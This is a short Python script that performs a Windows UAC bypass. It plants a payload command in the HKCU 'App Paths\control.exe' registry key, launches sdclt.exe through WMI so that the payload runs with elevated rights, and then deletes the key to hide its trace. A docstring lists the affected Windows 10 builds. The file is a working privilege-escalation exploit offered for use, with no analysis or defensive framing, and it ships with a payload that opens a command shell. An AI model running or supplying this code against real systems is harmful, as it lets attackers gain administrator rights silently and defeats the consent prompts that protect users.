"""
Works from: Windows 10 TH1 (10240)
Fixed in: Windows 10 RS3 (16215)
Tested and does not work in Windows 8.1(9600)
"""
import os
import wmi
import time
import winreg

wmi = wmi.WMI()

def sdclt_control(payload):
	print("Attempting to create registry key")
	try:
		key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
		winreg.SetValueEx(key,None,0,winreg.REG_SZ,payload)
		winreg.CloseKey(key)
	except Exception as error:
		print("Unable to create key")
	else:
		print("Registry key created")
		
	print("Pausing for 5 seconds before executing")
	time.sleep(5)

	print("Attempting to create process")
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start sdclt.exe",ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
		if (result[1] == 0):
			print("Process started successfully")
		else:
			print("Problem creating process")
	except Exception as error:
		print("Problem creating process")

	print("Pausing for 5 seconds before cleaning")
	time.sleep(5)
	
	print("Attempting to remove registry key")
	try:
		winreg.DeleteKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
	except Exception as error:
		print("Unable to delete key")
		return False
	else:
		print("Registry key was deleted")
payload="cmd.exe \k"
sdclt_control(payload)
